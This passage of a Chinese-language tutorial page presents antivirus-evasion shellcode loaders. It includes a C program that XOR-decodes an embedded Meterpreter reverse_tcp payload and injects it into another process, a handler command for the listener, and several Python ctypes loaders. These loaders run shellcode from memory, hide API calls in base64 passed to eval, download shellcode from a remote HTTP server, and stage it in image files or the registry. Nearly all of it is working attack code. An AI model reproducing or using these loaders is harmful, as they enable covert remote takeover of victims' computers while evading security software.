class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">// msf生成shellcode：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.81.234 lport=7890 -f c -o raw.c</span></span><br><span class="line"><span class="comment">// 使用xor加密Shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\x56\xe2\x29\x4e\x5a\x42\x66\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\xe2\x21\xf8\xb2\xfb\xe2\x21\xf8\x8a\xfc\xe2\x21\xd8\xfa\xe7\x9b\x63\xe2\xa5\x1d\xe0\xe0\xe2\x9b\x6a\x6\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xeb\xfb\xe2\x21\xf8\x8a\x21\xe8\x96\xe2\xab\x7a\xcc\x2b\xd2\xb2\xa1\xa8\xa5\x2f\xd8\xaa\xaa\xaa\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xcd\xe2\xab\x7a\xfa\x21\xe2\xb2\xee\x21\xea\x8a\xe3\xab\x7a\x49\xfc\xe2\x55\x63\xeb\x21\x9e\x22\xe2\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x6\xeb\x6b\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x72\xf2\xee\x21\xea\x8e\xe3\xab\x7a\xcc\xeb\x21\xa6\xe2\xee\x21\xea\xb6\xe3\xab\x7a\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\xe2\x21\xb8\x43\xe1\x55\x55\x55\xf7\xe3\x14\xdd\xd9\x98\xf5\x99\x98\xaa\xaa\xeb\xfc\xe3\x23\x4c\xe2\x2b\x46\xa\xab\xaa\xaa\xe3\x23\x4f\xe3\x16\xa8\xaa\xb4\x78\x6a\x2\xfb\x40\xeb\xfe\xe3\x23\x4e\xe6\x23\x5b\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe6\x23\x40\xc2\xab\xab\xaa\xaa\xf3\xeb\x10\x83\x2a\xc1\xaa\x55\x7f\xc0\xa0\xeb\xf4\xfa\xfa\xe7\x9b\x63\xe7\x9b\x6a\xe2\x55\x6a\xe2\x23\x68\xe2\x55\x6a\xe2\x23\x6b\xeb\x10\x40\xa5\x75\x4a\x55\x7f\xe2\x23\x6d\xc0\xba\xeb\xf2\xe6\x23\x48\xe2\x23\x53\xeb\x10\x33\xf\xde\xcb\x55\x7f\x2f\x6a\xde\xa0\xe3\x55\x64\xdf\x4f\x42\x39\xaa\xaa\xaa\xe2\x29\x46\xba\xe2\x23\x48\xe7\x9b\x63\xc0\xae\xeb\xf2\xe2\x23\x53\xeb\x10\xa8\x73\x62\xf5\x55\x7f\x29\x52\xaa\xd4\xff\xe2\x29\x6e\x8a\xf4\x23\x5c\xc0\xea\xeb\xf3\xc2\xaa\xba\xaa\xaa\xeb\xf2\xe2\x23\x58\xe2\x9b\x63\xeb\x10\xf2\xe\xf9\x4f\x55\x7f\xe2\x23\x69\xe3\x23\x6d\xe7\x9b\x63\xe3\x23\x5a\xe2\x23\x70\xe2\x23\x53\xeb\x10\xa8\x73\x62\xf5\x55\x7f\x29\x52\xaa\xd7\x82\xf2\xeb\xfd\xf3\xc2\xaa\xea\xaa\xaa\xeb\xf2\xc0\xaa\xf0\xeb\x10\xa1\x85\xa5\x9a\x55\x7f\xfd\xf3\xeb\x10\xdf\xc4\xe7\xcb\x55\x7f\xe3\x55\x64\x43\x96\x55\x55\x55\xe2\xab\x69\xe2\x83\x6c\xe2\x2f\x5c\xdf\x1e\xeb\x55\x4d\xf2\xc0\xaa\xf3\xe3\x6d\x68\x5a\x1f\x8\xfc\x55\x7f&quot;</span>;</span><br><span class="line"><span class="comment">//注入进程</span></span><br><span class="line"><span class="function">BOOL <span class="title">InjectShellCode</span><span class="params">(<span class="type">int</span> Pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE Handle, remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    <span class="type">int</span> password = <span class="number">0xAA</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ShellCode[<span class="number">10000</span>];</span><br><span class="line">    <span class="type">int</span> nLen = <span class="built_in">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//将shellcode还原</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    ShellCode[i] = buf[i] ^ password;</span><br><span class="line"><span class="comment">//     printf(&quot;\\x%x&quot;, ShellCode[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode loding~&quot;</span>);</span><br><span class="line">    <span class="comment">//开始注入进程</span></span><br><span class="line">    Handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(Handle, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(ShellCode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(Handle, remoteBuffer, ShellCode, <span class="built_in">sizeof</span>(ShellCode), <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(Handle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(Handle);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> conv = <span class="built_in">strtol</span>(argv[<span class="number">1</span>], &amp;p, <span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 检查错误：例如，输入的是字符串而不是整数，或者输入的整数超过int范围</span></span><br><span class="line">    <span class="keyword">if</span> (errno != <span class="number">0</span> || *p != <span class="string">&#x27;\0&#x27;</span> || conv &gt; INT_MAX || conv &lt; INT_MIN) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pid = conv;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InjectShellCode</span>(pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注入进行，上线</span></span><br><span class="line">InjectXor.exe pid</span><br><span class="line">InjectXor.exe <span class="number">18040</span></span><br><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">124.223</span>.<span class="number">217.243</span> <span class="literal">-P</span> <span class="number">4321</span></span><br></pre></td></tr></table></figure><h1 id="Python加载Shellcode（学完-python-再来看）"><a href="#Python加载Shellcode（学完-python-再来看）" class="headerlink" title="Python加载Shellcode（学完 python 再来看）"></a>Python加载Shellcode（学完 python 再来看）</h1><h2 id="pyinstaller-打包-python-代码为-exe"><a href="#pyinstaller-打包-python-代码为-exe" class="headerlink" title="pyinstaller 打包 python 代码为 exe"></a>pyinstaller 打包 python 代码为 exe</h2><p>执行 python 的代码需要有 python 环境，但是呢，我们可以直接打包可执行程序～～～这样限制就少了一点</p><ol><li>安装 pyinstaller</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure><ol start="2"><li>打包 python 代码</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller.exe -F -w .\sc.py</span><br></pre></td></tr></table></figure><h2 id="shellcodeLoder-Python（上节学过）"><a href="#shellcodeLoder-Python（上节学过）" class="headerlink" title="shellcodeLoder-Python（上节学过）"></a>shellcodeLoder-Python（上节学过）</h2><blockquote><p>这种简单的shellcode很容易被秒杀，可以逐行代码测试哪里有问题，再想办法绕过修改</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes<span class="comment">#主要用到此库</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果测试，该函数部分的代码，被杀软标记，瞬间就被查杀，后面有解救方法，下面注释的两行代码可以解决ctypes.windll.kernel32.RtlMoveMemory部分被查杀的结局</span></span><br><span class="line"><span class="comment">#rtm = b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkp&quot;</span></span><br><span class="line"><span class="comment">#eval(str(base64.b64decode(rtm),&#x27;utf-8&#x27;))</span></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line"> ctypes.c_uint64(ptr), </span><br><span class="line"> buf, </span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="base-loader-py"><a href="#base-loader-py" class="headerlink" title="base_loader.py"></a>base_loader.py</h2><blockquote><p>以参数形式传入shellcode的好处就是不会被检测到，实际上就是一个分离免杀</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#以参数形式，传入16进制的shellcode，记得去掉\x</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="built_in">bytes</span>.fromhex(sys.argv[<span class="number">1</span>]))</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), types.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.c_int(<span class="number">0</span>), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int</span><br><span class="line">(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>上线</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_loader.exe 16进制数据</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209200216479.png" alt="image-20220920021629195"></p><h2 id="loader-ms-py"><a href="#loader-ms-py" class="headerlink" title="loader_ms.py"></a>loader_ms.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="built_in">bytes</span>.fromhex(sys.argv[<span class="number">1</span>]))</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">rtm = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkp&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(rtm),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ct = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSk=&quot;</span></span><br><span class="line">handle = <span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(ct), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="loader-b64-py"><a href="#loader-b64-py" class="headerlink" title="loader_b64.py"></a>loader_b64.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment"># base64编码shellcode \xfc\x48\x83\xe4\xf0......\xa2\x56\xff\xd5</span></span><br><span class="line">shellcode = <span class="string">&quot;XHhmY1......ZmZceGQ1&quot;</span></span><br><span class="line"><span class="comment">#运行时解码shellcode</span></span><br><span class="line">shellcode = base64.b64decode(shellcode)</span><br><span class="line"><span class="comment">#转化为字节类型</span></span><br><span class="line">shellcode = codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># shellcode = bytearray(codecs.escape_decode(base64.b64decode(shellcode))[0])</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"><span class="comment">#原函数是：ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf, ctypes.c_int(len(shellcode)))</span></span><br><span class="line"><span class="comment">#base编码后就是rtm后面双引号之中的内容</span></span><br><span class="line">rtm = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkp&quot;</span></span><br><span class="line"><span class="comment">#解码为字符串，再通过eval函数执行字符串</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(rtm),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">ct = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSk=&quot;</span></span><br><span class="line">handle = <span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(ct), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="loader-http-py"><a href="#loader-http-py" class="headerlink" title="loader_http.py"></a>loader_http.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># base64加密shellcode放在1.txt之中</span></span><br><span class="line"><span class="comment">#通过requert库下载远程的1.txt</span></span><br><span class="line">shell = requests.get(<span class="string">&#x27;http://ip:8000/1.txt&#x27;</span>)</span><br><span class="line"><span class="comment">#转换为字节数据</span></span><br><span class="line">shellcode = base64.b64decode(shell.text)</span><br><span class="line">shellcode = codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># shellcode = bytearray(codecs.escape_decode(base64.b64decode(shellcode))[0])</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), types.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">rtm = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkp&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(rtm),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ct = <span class="string">b&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSk=&quot;</span></span><br><span class="line">handle = <span class="built_in">eval</span>(<span class="built_in">str</span>(base64.b64decode(ct), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#远程主机启用http服务</span></span><br><span class="line">python3 -m http.server </span><br><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">~</span><br></pre></td></tr></table></figure><h2 id="loader-png-py"><a href="#loader-png-py" class="headerlink" title="loader_png.py"></a>loader_png.py</h2><p>加载png中的shellcode，分离免杀</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="comment"># 打开文件读取shellcode，并转换为字节类型</span></span><br><span class="line">shellf = <span class="built_in">open</span>(<span class="string">&quot;payload.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">shellcode = shellf.read()</span><br><span class="line"><span class="comment">#转换为字节的类型</span></span><br><span class="line">shellcode = codecs.escape_decode(shellcode)[<span class="number">0</span>]</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 1. 通过 VirtualAlloc 申请内存区域</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64;</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), types.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>));</span><br><span class="line"><span class="comment"># 2. 通过 RtlMoveMemory 把shellcode复制到申请的内存中</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode);</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)) )</span><br><span class="line"><span class="comment"># 3. 通过 CreateThread 创建线程执行shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.c_uint64(ptr), ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"><span class="comment"># 4. 通过  WaitForSingleObject 检测线程对象的状态，为了让线程一直处于运行状态</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="loader-regQueryValueEx-py"><a href="#loader-regQueryValueEx-py" class="headerlink" title="loader_regQueryValueEx.py"></a>loader_regQueryValueEx.py</h2><blockquote><p>注册表可以存储shellcode，再读取加载，这样就没有shellcode文件落地</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.wintypes <span class="keyword">import</span> *</span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0&quot;</span></span><br><span class="line"><span class="comment"># 通过 ctypes 库调用 RegQueryValueExA 函数实现上线 cs</span></span><br><span class="line"><span class="comment"># RegSetValueExA 函数在Advapi32.dll库中，可以设置注册表项下指定值的数据和类型</span></span><br><span class="line"><span class="comment"># https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa</span></span><br><span class="line"><span class="comment"># LSTATUS RegSetValueExA(</span></span><br><span class="line"><span class="comment">#   HKEY       hKey, // 注册表HKLM_CURRWNT_USER -2147483647</span></span><br><span class="line"><span class="comment">#   LPCSTR     lpValueName, //注册表项中新建的值</span></span><br><span class="line"><span class="comment">#   DWORD      Reserved,</span></span><br><span class="line"><span class="comment">#   DWORD      dwType, // 值的类型，存储二进制，值类型为REG_BINARY python中为3</span></span><br><span class="line"><span class="comment">#   const BYTE *lpData, // 写入的数据，写入shellcode</span></span><br><span class="line"><span class="comment">#   DWORD      cbData  //数据大小</span></span><br><span class="line"><span class="comment"># );</span></span><br><span class="line"><span class="comment">#将shellcode写入注册表中，新建了一个test的注册表项</span></span><br><span class="line">ctypes.windll.Advapi32.RegSetValueExA(-<span class="number">2147483647</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">None</span>, <span class="number">3</span>, buf, <span class="built_in">len</span>(buf))</span><br><span class="line"><span class="comment"># 根据需要的指针类型将内存改为LPBYTE的指针</span></span><br><span class="line">LPBYTE = POINTER(c_byte)</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = LPBYTE</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="number">800</span>, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">data_len = DWORD()</span><br><span class="line"><span class="comment"># RegQueryValueExA 函数，用于检索与打开的注册表项关联的指定值名称的类型和数据</span></span><br><span class="line"><span class="comment"># https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexa</span></span><br><span class="line"><span class="comment"># LSTATUS RegQueryValueExA(</span></span><br><span class="line"><span class="comment">#   HKEY    hKey,</span></span><br><span class="line"><span class="comment">#   LPCSTR  lpValueName,</span></span><br><span class="line"><span class="comment">#   LPDWORD lpReserved,</span></span><br><span class="line"><span class="comment">#   LPDWORD lpType,</span></span><br><span class="line"><span class="comment">#   LPBYTE  lpData, // 接收查询到的shellcode</span></span><br><span class="line"><span class="comment">#   LPDWORD lpcbData  // shellcode长度，</span></span><br><span class="line"><span class="comment"># );</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行 RegQueryValueExA 来获取shellcode长度</span></span><br><span class="line">ctypes.windll.Advapi32.RegQueryValueExA(-<span class="number">2147483647</span>, <span class="string">&quot;test&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, byref(data_len))</span><br><span class="line"><span class="comment"># 执行 RegQueryValueExA 读shellcode到申请的内存</span></span><br><span class="line">ctypes.windll.Advapi32.RegQueryValueExA(-<span class="number">2147483647</span>, <span class="string">&quot;test&quot;</span>, <span class="number">0</span>, <span class="literal">None</span>, ptr, byref(data_len))</span><br><span class="line"><span class="comment"># 删除注册表中创建的值</span></span><br><span class="line">ctypes.windll.Advapi32.RegDeleteValueA(-<span class="number">2147483647</span>, <span class="string">&quot;test&quot;</span>)</span><br><span class="line"><span class="comment"># 创建线程执行 shellcode</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span 